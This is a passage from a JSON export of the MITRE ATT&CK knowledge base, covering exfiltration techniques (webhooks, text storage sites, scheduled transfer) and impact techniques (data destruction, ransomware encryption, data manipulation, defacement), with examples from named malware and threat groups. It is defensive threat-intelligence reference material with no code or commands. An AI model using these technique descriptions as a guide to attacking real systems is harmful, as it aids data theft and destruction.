other information.", "detailed_description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebin[.]com, are commonly used by developers to share code and other information.\nText storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely.\nNote: This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.", "id": "T1567.003", "examples": []}, {"name": "Exfiltration Over Webhook", "description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and webhook.site, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application.", "detailed_description": "Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. Many public and commercial services, such as Discord, Slack, and webhook.site, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application.\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it.\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service.", "id": "T1567.004", "examples": []}]}, {"name": "Scheduled Transfer", "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.", "detailed_description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability.\nWhen scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.", "id": "T1029", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can set itself to sleep before requesting a new command from C2."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday)."}, {"id": "S0200", "name": "Dipsind", "description": "Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has the ability to wait for a specified time interval between communicating with and executing commands from C2."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can be configured to reconnect at certain intervals."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar can sleep for a specific time and be set to communicate at specific intervals."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron can be configured to exfiltrate data during nighttime or working hours."}, {"id": "S0211", "name": "Linfo", "description": "Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure."}, {"id": "S0409", "name": "Machete", "description": "Machete sends stolen data to the C2 server every 10 minutes."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can configure its agent to work only in specific time frames."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can sleep for a given number of seconds."}, {"id": "S0596", "name": "ShadowPad", "description": "ShadowPad has sent data back to C2 every 8 hours."}, {"id": "S1019", "name": "Shark", "description": "Shark can pause C2 communications for a specified time."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat can sleep when instructed to do so by the C2."}, {"id": "S0668", "name": "TinyTurla", "description": "TinyTurla contacts its C2 based on a scheduled timing set in its configuration."}], "sub_techniques": []}, {"name": "Transfer Data to Cloud Account", "description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.", "detailed_description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.", "id": "T1537", "examples": [{"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used Megasync to exfiltrate data to the cloud."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service."}], "sub_techniques": []}]}, {"name": "Impact", "description": "The adversary is trying to manipulate, interrupt, or destroy your systems and data.Impact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes. Techniques used for impact can include destroying or tampering with data. In some cases, business processes can look fine, but may have been altered to benefit the adversaries\u2019 goals. These techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.", "id": "TA0040", "techniques": [{"name": "Account Access Removal", "description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.", "detailed_description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform a System Shutdown/Reboot to set malicious changes into place.\nIn Windows, Net utility, Set-LocalUser and Set-ADAccountPassword PowerShell cmdlets may be used by adversaries to modify user accounts. In Linux, the passwd utility may be used to change passwords. Accounts could also be disabled by Group Policy.\nAdversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such as Data Destruction and Defacement, in order to impede incident response/recovery before completing the Data Encrypted for Impact objective.", "id": "T1531", "examples": [{"id": "G1024", "name": "Akira", "description": "Akira deletes administrator accounts in victim networks prior to encryption."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD changes the password for local and domain users via net.exe to a random 32 character string to prevent these accounts from logging on. Additionally, DEADWOOD will terminate the winlogon.exe process to prevent attempts to log on to the infected system."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has removed a targeted organization's global admin accounts to lock the organization out of all access."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga has been observed changing account passwords and logging off current users."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has changed user account passwords and logged users off the system."}, {"id": "S0688", "name": "Meteor", "description": "Meteor has the ability to change the password of local users on compromised hosts and can log off users."}], "sub_techniques": []}, {"name": "Data Destruction", "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.", "detailed_description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. Common operating system file deletion commands such as del and rm often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. In some cases politically oriented image files have been used to overwrite data.\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares..\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers.", "id": "T1485", "examples": [{"id": "C0034", "name": "2022 Ukraine Electric Power Attack", "description": "During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim\u2019s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions."}, {"id": "S1125", "name": "AcidRain", "description": "AcidRain performs an in-depth wipe of the target filesystem and various attached storage devices through either a data overwrite or calling various IOCTLS to erase it."}, {"id": "S1133", "name": "Apostle", "description": "Apostle initially masqueraded as ransomware but actual functionality is a data destruction tool, supported by an internal name linked to an early version, wiper-action. Apostle writes random data to original files after an encrypted copy is created, along with resizing the original file to zero and changing time property metadata before finally deleting the original file."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used a custom secure delete function to make deleted files unrecoverable."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy 2 contains a \"Destroy\" plug-in that destroys data stored on victim hard drives by overwriting file contents."}, {"id": "S0693", "name": "CaddyWiper", "description": "CaddyWiper can work alphabetically through drives on a compromised system to take ownership of and overwrite all files."}, {"id": "S1134", "name": "DEADWOOD", "description": "DEADWOOD overwrites files on victim systems with random data to effectively destroy them."}, {"id": "S0659", "name": "Diavol", "description": "Diavol can delete specified files from a targeted system."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can recursively wipe folders and files in Windows, Program Files, Program Files(x86), PerfLogs, Boot, System, Volume Information, and AppData folders using FSCTL_MOVE_FILE. HermeticWiper can also overwrite symbolic links and big files in My Documents and on the Desktop with random bytes."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer\u2019s data wiper module clears registry keys and overwrites both ICS configuration and Windows files."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar can overwrite files with random data before deleting them."}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk deletes system files to make the OS unbootable. KillDisk also targets and deletes files with 35 different file extensions."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has deleted the target's systems and resources both on-premises and in the cloud."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used a custom secure delete function to overwrite file contents with data from heap memory."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can fill a victim's files and directories with zero-bytes in replacement of real content before deleting them."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper deletes files on network drives, but corrupts and overwrites with random data files stored locally."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer overwrites files locally and on remote shares."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke has a command to write random data across a file and delete it."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc can overwrite files indicated by the attacker before deleting them."}, {"id": "S0364", "name": "RawDisk", "description": "RawDisk was used in Shamoon to write to protected system locations such as the MBR and disk partitions in an effort to destroy data."}, {"id": "S0496", "name": "REvil", "description": "REvil has the capability to destroy files and folders."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used CaddyWiper, SDelete, and the BlackEnergy KillDisk component to overwrite files on victim systems.  Additionally, Sandworm Team has used the JUNKMAIL tool to overwrite files with null bytes."}, {"id": "S0195", "name": "SDelete", "description": "SDelete deletes data in a way that makes it unrecoverable."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon attempts to overwrite operating system files and disk structures with image files. In a later variant, randomly generated data was used for data overwrites."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill has a disk wiper module that targets files other than those in the Windows directory."}, {"id": "S0689", "name": "WhisperGate", "description": "WhisperGate can corrupt files by overwriting the first 1 MB with 0xcc and appending random extensions."}, {"id": "S0341", "name": "Xbash", "description": "Xbash has destroyed Linux-based databases as part of its ransomware capabilities."}], "sub_techniques": [{"name": "Lifecycle-Triggered Deletion", "description": "Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.", "detailed_description": "Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.\nCloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time. If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once.\nFor example, in AWS environments, an adversary with the PutLifecycleConfiguration permission may use the PutBucketLifecycle API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day. In addition to destroying data for purposes of extortion and Financial Theft, adversaries may also perform this action on buckets storing cloud logs for Indicator Removal.", "id": "T1485.001", "examples": []}]}, {"name": "Data Encrypted for Impact", "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.", "detailed_description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\nIn cloud environments, storage objects within compromised accounts may also be encrypted.", "id": "T1486", "examples": [{"id": "S1129", "name": "Akira", "description": "Akira encrypts victim filesystems for financial extortion purposes."}, {"id": "G1024", "name": "Akira", "description": "Akira encrypts files in victim environments as part of ransomware operations."}, {"id": "S1133", "name": "Apostle", "description": "Apostle creates new, encrypted versions of files then deletes the originals, with the new filenames consisting of a random GUID and \".lock\" for an extension."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used Hermes ransomware to encrypt files with AES256."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user. APT41 also used Microsoft Bitlocker to encrypt workstations and Jetico\u2019s BestCrypt to encrypt servers."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon encrypts the victim system using a combination of AES256 and RSA encryption schemes."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has encrypted files and network resources using AES-256 and added an .avos, .avos2, or .AvosLinux extension to filenames."}, {"id": "S0638", "name": "Babuk", "description": "Babuk can use ChaCha8 and ECDH to encrypt data."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has encrypted files and disks using AES-128-CBC and RSA-2048."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending .locked to the filename."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability to encrypt Windows devices, Linux devices, and VMWare instances."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors used Conti ransomware to encrypt a compromised network."}, {"id": "C0018", "name": "C0018", "description": "During C0018, the threat actors used AvosLocker ransomware to encrypt files on the compromised network."}, {"id": "S1096", "name": "Cheerscrypt", "description": "Cheerscrypt can encrypt data on victim machines using a Sosemanuk stream cipher with an Elliptic-curve Diffie\u2013Hellman (ECDH) generated key."}, {"id": "S0611", "name": "Clop", "description": "Clop can encrypt files using AES, RSA, and RC4 and will add the \".clop\" extension to encrypted files."}, {"id": "S0575", "name": "Conti", "description": "Conti can use CreateIoCompletionPort(), PostQueuedCompletionStatus(), and GetQueuedCompletionPort() to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. Conti can use \"Windows Restart Manager\" to ensure files are unlocked and open for encryption."}, {"id": "S0625", "name": "Cuba", "description": "Cuba has the ability to encrypt system data and add the \".cuba\" extension to encrypted files."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate can deploy follow-on ransomware payloads."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has encrypted drives using the core encryption mechanism from DiskCryptor."}, {"id": "S0616", "name": "DEATHRANSOM", "description": "DEATHRANSOM can use public and private key pair encryption to encrypt files for ransom payment."}, {"id": "S0659", "name": "Diavol", "description": "Diavol has encrypted files using an RSA key though the CryptEncrypt API and has appended filenames with \".lock64\". "}, {"id": "S0554", "name": "Egregor", "description": "Egregor can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note."}, {"id": "S0605", "name": "EKANS", "description": "EKANS uses standard encryption library functions to encrypt files."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks."}, {"id": "S0618", "name": "FIVEHANDS", "description": "FIVEHANDS can use an embedded NTRU public key to encrypt data for ransom."}, {"id": "S0617", "name": "HELLOKITTY", "description": "HELLOKITTY can use an embedded RSA-2048 public key to encrypt victim data for ransom."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used ROADSWEEP ransomware to encrypt files on targeted systems."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used INC Ransomware to encrypt victim's data."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware can encrypt data on victim systems, including through the use of partial encryption and multi-threading to speed encryption."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has encrypted domain-controlled systems using BitPaymer. Additionally, Indrik Spider used PsExec to execute a ransomware script."}, {"id": "S0389", "name": "JCry", "description": "JCry has encrypted files and demanded Bitcoin to decrypt those files. "}, {"id": "S0607", "name": "KillDisk", "description": "KillDisk has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted."}, {"id": "S0372", "name": "LockerGoga", "description": "LockerGoga has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations. "}, {"id": "S0449", "name": "Maze", "description": "Maze has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. Maze has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process."}, {"id": "S1137", "name": "Moneybird", "description": "Moneybird targets a common set of file types such as documents, certificates, and database files for encryption while avoiding executable, dynamic linked libraries, and similar items."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet has deployed ransomware in victim environments."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can encrypt files on infected machines to extort victims."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya encrypts user files and disk structures like the MBR with 2048-bit RSA."}, {"id": "S0556", "name": "Pay2Key", "description": "Pay2Key can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption."}, {"id": "S1162", "name": "Playcrypt", "description": "Playcrypt encrypts files on targeted hosts with an AES-RSA hybrid encryption, encrypting every other file portion of 0x100000 bytes."}, {"id": "S1058", "name": "Prestige", "description": "Prestige has leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with .enc."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom."}, {"id": "S0496", "name": "REvil", "description": "REvil can encrypt files on victim systems and demands a ransom to decrypt the files."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP can RC4 encrypt content in blocks on targeted systems."}, {"id": "S0400", "name": "RobbinHood", "description": "RobbinHood will search for an RSA encryption key and then perform its encryption process on the system files."}, {"id": "S1073", "name": "Royal", "description": "Royal uses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory."}, {"id": "S0370", "name": "SamSam", "description": "SamSam encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has used BlackCat ransomware to encrypt files on VMWare ESXi servers."}, {"id": "S0639", "name": "Seth-Locker", "description": "Seth-Locker can encrypt files on a targeted system, appending them with the suffix .seth."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon has an operational mode for encrypting data instead of overwriting it."}, {"id": "S0242", "name": "SynAck", "description": "SynAck encrypts the victims machine followed by asking the victim to pay a ransom. "}, {"id": "G0092", "name": "TA505", "description": "TA505 has used a wide variety of ransomware, such as Clop, Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can encrypt data and leave a ransom note."}, {"id": "S0341", "name": "Xbash", "description": "Xbash has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET performs AES-CBC encryption on files under ~/Documents, ~/Downloads, and~/Desktop with a fixed key and renames files to give them a .enc extension. Only files with sizes less than 500MB are encrypted."}], "sub_techniques": []}, {"name": "Data Manipulation", "description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.", "detailed_description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "id": "T1565", "examples": [{"id": "G1016", "name": "FIN13", "description": "FIN13 has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money."}], "sub_techniques": [{"name": "Stored Data Manipulation", "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.", "detailed_description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data. By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "id": "T1565.001", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions."}, {"id": "S1135", "name": "MultiLayer Wiper", "description": "MultiLayer Wiper changes the original path information of deleted files to make recovery efforts more difficult."}, {"id": "S0562", "name": "SUNSPOT", "description": "SUNSPOT created a copy of the SolarWinds Orion software source file with a .bk extension to backup the original content, wrote SUNBURST using the same filename but with a .tmp extension, and then moved SUNBURST using MoveFileEx to the original filename with a .cs extension so it could be compiled within Orion software."}]}, {"name": "Transmitted Data Manipulation", "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.", "detailed_description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data. By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "id": "T1565.002", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 has used DYEPACK to manipulate SWIFT messages en route to a printer."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron is capable of modifying email content, headers, and attachments during transit."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address."}]}, {"name": "Runtime Data Manipulation", "description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.", "detailed_description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data. By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\nAdversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct Change Default File Association and Masquerading to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.", "id": "T1565.003", "examples": [{"id": "G0082", "name": "APT38", "description": "APT38 has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user."}]}]}, {"name": "Defacement", "description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.", "detailed_description": "Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.", "id": "T1491", "examples": [], "sub_techniques": [{"name": "Internal Defacement", "description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.", "detailed_description": "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper. Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.", "id": "T1491.001", "examples": [{"id": "S1070", "name": "Black Basta", "description": "Black Basta has set the desktop wallpaper on victims' machines to display a ransom note."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can change the desktop wallpaper on compromised hosts."}, {"id": "S0659", "name": "Diavol", "description": "After encryption, Diavol will capture the desktop background window, set the background color to black, and change the desktop wallpaper to a newly created bitmap image with the text \"All your files are encrypted! For more information see \"README-FOR-DECRYPT.txt\"."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has left taunting images and messages on the victims' desktops as proof of system access."}, {"id": "S1139", "name": "INC Ransomware", "description": "INC Ransomware has the ability to change the background wallpaper image to display the ransom note."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group replaced the background wallpaper of systems with a threatening image after rendering the system unbootable with a Disk Structure Wipe."}, {"id": "S0688", "name": "Meteor", "description": "Meteor can change both the desktop wallpaper and the lock screen image to a custom image."}, {"id": "S1150", "name": "ROADSWEEP", "description": "ROADSWEEP has dropped ransom notes in targeted folders prior to encrypting the files."}]}, {"name": "External Defacement", "description": "An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system\u2019s integrity. Externally-facing 